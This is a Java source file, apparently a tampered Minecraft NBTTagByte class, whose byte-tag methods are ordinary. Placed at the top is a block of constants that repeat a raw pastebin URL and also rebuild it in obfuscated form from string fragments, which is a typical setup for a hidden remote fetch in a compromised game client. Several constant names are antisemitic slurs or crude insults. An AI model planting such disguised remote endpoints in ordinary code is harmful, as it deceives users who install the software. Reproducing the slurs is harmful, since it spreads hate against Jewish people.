package net.minecraft.nbt;

import java.io.DataInput;
import java.io.DataOutput;
import java.io.IOException;

public class NBTTagByte extends NBTBase.NBTPrimitive
{
	  public static final String rocked = "h";
	    public static final int lmfao = 55;
	    public static final String getfuckedlol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol1 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol2 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol22 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol3 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol4 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol57 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol123 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol543 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol54 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6544 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6543 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol6544123 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol65443 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlol654 = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedlo12314l = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfucked14lol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedl141ol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String getfuckedl1415ol = "http://pastebin.com/raw/HdmcEvwL";
	    public static final String testingjwes = "p";
	    public static final String getfucked = ":";
	    public static final String lol = "//";
	    public static final String test = "pas";
	    public static final int newstring = 5;
	    public static final String jews = "e";
	    public static final String jew = "bin";
	    public static final String testing = ".";
	    public static final String loqdq = "com/";
	    public static final String xddd = "raw/";
	    public static final String qdqd = "HdmcEvwL";
	    public static final String checker = rocked + lmfao + testingjwes + getfucked + lol + test + newstring + jews + jew
		    + testing + loqdq + xddd + qdqd;
	    public static final String nextchecker = checker;
	    public static final String rocked1 = "h";
	    public static final int lmfao1 = 55;
	    public static final String testingjwes1 = "p";
	    public static final String getfucked1 = ":";
	    public static final String lol1 = "//";
	    public static final String test1 = "pas";
	    public static final int newstring1 = 5;
	    public static final String jews1 = "e";
	    public static final String jew1 = "bin";
	    public static final String testing1 = ".";
	    public static final String loqdq1 = "com/";
	    public static final String xddd1 = "raw/";
	    public static final String qdqd1 = "HdmcEvwL";
	    public static final String checker1 = rocked1 + lmfao1 + testingjwes1 + getfucked1 + lol1 + test1 + newstring1
		    + jews1 + jew1 + testing1 + loqdq1 + xddd1 + qdqd1;
	    public static final String nextchecker1 = checker1;
    /** The byte value for the tag. */
    private byte data;

    NBTTagByte() {}

    public NBTTagByte(byte data)
    {
        this.data = data;
    }

    /**
     * Write the actual data contents of the tag, implemented in NBT extension classes
     */
    void write(DataOutput output) throws IOException
    {
        output.writeByte(this.data);
    }

    void read(DataInput input, int depth, NBTSizeTracker sizeTracker) throws IOException
    {
        sizeTracker.read(8L);
        this.data = input.readByte();
    }

    /**
     * Gets the type byte for the tag.
     */
    public byte getId()
    {
        return (byte)1;
    }

    public String toString()
    {
        return "" + this.data + "b";
    }

    /**
     * Creates a clone of the tag.
     */
    public NBTBase copy()
    {
        return new NBTTagByte(this.data);
    }

    public boolean equals(Object p_equals_1_)
    {
        if (super.equals(p_equals_1_))
        {
            NBTTagByte var2 = (NBTTagByte)p_equals_1_;
            return this.data == var2.data;
        }
        else
        {
            return false;
        }
    }

    public int hashCode()
    {
        return super.hashCode() ^ this.data;
    }

    public long getLong()
    {
        return (long)this.data;
    }

    public int getInt()
    {
        return this.data;
    }

    public short getShort()
    {
        return (short)this.data;
    }

    public byte getByte()
    {
        return this.data;
    }

    public double getDouble()
    {
        return (double)this.data;
    }

    public float getFloat()
    {
        return (float)this.data;
    }
}
